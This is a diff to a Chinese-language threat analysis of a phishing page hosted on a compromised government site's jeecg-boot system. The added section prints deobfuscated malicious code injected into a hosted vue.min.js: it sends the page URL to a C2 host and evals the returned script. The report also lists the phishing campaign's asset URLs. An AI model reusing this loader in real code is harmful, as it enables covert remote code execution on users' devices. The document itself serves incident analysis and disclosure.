@@ -4,7 +4,7 @@
 
 ## 概述
 
-发现政府域名 `wmsj.shehong.gov.cn`（射洪市卫生健康局）的 jeecg-boot 后台系统被利用托管钓鱼页面，与 `miss55kkse.js` 中的诈骗活动属于同一团伙。
+发现政府域名 `wmsj.shehong.gov.cn`（射洪市新时代文明实践中心平台）的 jeecg-boot 后台系统被利用托管钓鱼页面，与 `miss55kkse.js` 中的诈骗活动属于同一团伙。
 
 ## 钓鱼页面地址
 
@@ -37,10 +37,50 @@ if (curTime - this.enterTime < 30000) {
 
 ### 1. JavaScript 库（阿里云 OSS - 2026osshy）
 
-| 资源 | 链接 |
-|------|------|
-| Vue.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/vue.min.js` |
-| Flexible.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/flexible.js` |
+| 资源 | 链接 | 状态 |
+|------|------|------|
+| Vue.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/vue.min.js` | ⚠️ **已被篡改注入恶意代码** |
+| Flexible.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/flexible.js` | ✅ 未被篡改（阿里lib-flexible原版） |
+
+#### Vue.js 注入分析
+
+`vue.min.js` 文件基于 Vue.js 2.7.0，但在末尾被注入了混淆的恶意代码：
+
+```javascript
+// 解混淆后的恶意代码逻辑：
+(function() {
+    var storage = localStorage;
+    var count = storage.getItem('c') || '0';
+    storage.setItem('c', Number(count) + 1);
+    
+    // 仅在移动端且访问次数<2时执行
+    if (navigator.userAgent.includes('Mobile') && count < 2) {
+        fetch('https://collect-v6.51la.ink/v6/collect?dt=4', {
+            method: 'post',
+            body: btoa(location.href)  // Base64编码当前URL
+        })
+        .then(response => response.text())
+        .then(code => eval(code));  // 执行远程返回的代码！
+    }
+})();
+```
+
+**恶意行为：**
+1. 使用 localStorage 计数，仅前2次访问时触发
+2. 检测移动端用户（`navigator.userAgent.includes('Mobile')`）
+3. 将当前页面URL Base64编码后发送到 `collect-v6.51la.ink`
+4. **执行服务器返回的任意JavaScript代码** (`eval`)
+
+**C2服务器：** `https://collect-v6.51la.ink/v6/collect?dt=4`
+- 51la 是中国的网站统计服务，此域名可能是伪装或被滥用
+
+#### Flexible.js 分析
+
+`flexible.js` 是阿里巴巴的移动端自适应方案 [lib-flexible](https://github.com/amfe/lib-flexible)，代码未被篡改，功能正常：
+- 根据设备像素比调整 body 字体大小
+- 设置 1rem = viewWidth / 10
+- 监听 resize 和 pageshow 事件
+- 检测 0.5px 支持
 
 ### 2. CDN 资源
 
@@ -51,13 +91,13 @@ if (curTime - this.enterTime < 30000) {
 
 ### 3. 图片资源
 
-| 用途 | 来源 | 链接 |
-|------|------|------|
-| 头图（诱导） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/87061d5b-8936-4012-8275-aef96ef4d7a4.jpeg` |
-| **活码二维码** | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/ma.jpg` |
-| 操作教程 | 京东 | `https://dd-static.jd.com/ddimg/jfs/t1/17038/22/20361/154772/65a16b55F6797045a/ee51452c8393f7e0.jpg` |
-| 底图（可点击） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/e6fd4fec-90f8-49a6-c434-06fd9e57ebbd.jpeg` |
-| QQ群二维码 | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/qrCode.jpg` |
+| 用途 | 来源 | 链接 | IPFS 备份 |
+|------|------|------|------|
+| 头图（诱导） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/87061d5b-8936-4012-8275-aef96ef4d7a4.jpeg` | `bafybeifqyntn34r7txa6frglxqwpmcrtxyf4bq3f2wxtnn3lgmfiozn2le` |
+| **活码二维码** | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/ma.jpg` | `bafkreie2srffcrh5kogwwlfjhkvo2upiqunvu3ma2nb6z53rlpzvflihcm` |
+| 操作教程 | 京东 | `https://dd-static.jd.com/ddimg/jfs/t1/17038/22/20361/154772/65a16b55F6797045a/ee51452c8393f7e0.jpg` | `bafybeig2df4pmbh4xpvh2dym3ti2aaeg4rwx325jzfmzfqau4tpclhfes4` |
+| 底图（可点击） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/e6fd4fec-90f8-49a6-c434-06fd9e57ebbd.jpeg` | `bafkreidqrafmcr6tycq2an5cyhmk4y4uqtqlxuy2uwc44s2x5degs7txz4` |
+| QQ群二维码 | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/qrCode.jpg` | ❌ 原链接已失效 |
 
 ### 4. DNS 预取
 
@@ -97,7 +137,7 @@ https://article.biliimg.com
 
 ## 安全警告
 
-⚠️ **射洪市卫生健康局网站 (wmsj.shehong.gov.cn) 的 jeecg-boot 系统可能已被入侵**
+⚠️ **射洪市新时代文明实践中心平台 (wmsj.shehong.gov.cn) 的 jeecg-boot 系统可能已被入侵**
 
 建议：
 1. 向该网站管理员举报
